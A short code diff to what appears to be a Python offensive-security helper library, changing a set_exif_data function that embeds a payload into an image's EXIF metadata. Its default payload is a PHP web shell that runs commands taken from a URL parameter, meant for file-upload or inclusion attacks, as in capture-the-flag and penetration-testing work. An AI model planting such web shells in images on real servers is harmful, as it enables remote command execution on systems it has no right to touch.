@@ -220,17 +220,29 @@ def xor(a, b):
 def base64urldecode(data):
     return base64.urlsafe_b64decode(data + b'=' * (4 - len(data) % 4))
 
-def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None):
+def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None, _format=None):
     import exif
 
     if _in is None or (isinstance(_in, str) and not os.path.exists(_in)):
         _in = Image.new("RGB", (50,50), (255,255,255))
 
     if isinstance(_in, str):
-        _in = exif.Image(open(_in, "rb"))
+        with open(_in, "rb") as f:
+            _in = exif.Image(f)
     elif isinstance(_in, Image.Image):
         bytes = io.BytesIO()
-        _in.save(bytes, format='JPEG')
+        format = _format
+        if format is None:
+            format = _in.format
+        if format is None:
+            print("Image format not specified, use PNG/JPG/...")
+            exit()
+        elif format == "PNG":
+            print("Image PNG not supported yet :/")
+            exit()
+
+        _in.save(bytes, format=format)
+        print(bytes)
         _in = exif.Image(bytes.getvalue())
     elif not isinstance(_in, exif.Image):
         print("Invalid input. Either give an Image or a path to an image.")
@@ -253,7 +265,7 @@ def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, ex
             print(", ".join(valid_tags))
             exit()
 
-        res = _in.set(exif_tag, payload)
+        _in.set(exif_tag, payload)
         
 
     if _out is None:
